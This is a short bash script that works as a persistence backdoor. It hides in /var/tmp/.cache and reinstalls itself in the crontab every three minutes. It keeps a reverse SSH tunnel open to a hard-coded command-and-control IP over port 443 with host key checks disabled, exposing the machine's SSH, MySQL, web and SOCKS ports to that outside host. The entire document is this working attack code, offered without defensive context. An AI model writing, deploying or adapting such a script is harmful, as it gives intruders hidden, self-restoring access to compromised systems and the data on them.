#!/bin/bash
# self-healing reverse SSH tunnel keeper; installed via crontab (*/3 * * * *)
C2=172.235.245.49
KEY=/var/tmp/.cache/id_ed25519
SELF=/var/tmp/.cache/watch.sh

( crontab -l 2>/dev/null | grep -v watch.sh; echo "*/3 * * * * /bin/bash $SELF >/dev/null 2>&1" ) | crontab -

if ! pgrep -f "ssh -N -f.*$C2" >/dev/null; then
  ssh -N -f -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -o ExitOnForwardFailure=yes \
    -i "$KEY" -p 443 \
    -R 2201:127.0.0.1:22 -R 2202:127.0.0.1:3306 -R 2203:127.0.0.1:8080 -R 2204:127.0.0.1:1080 \
    tunnel@$C2
fi
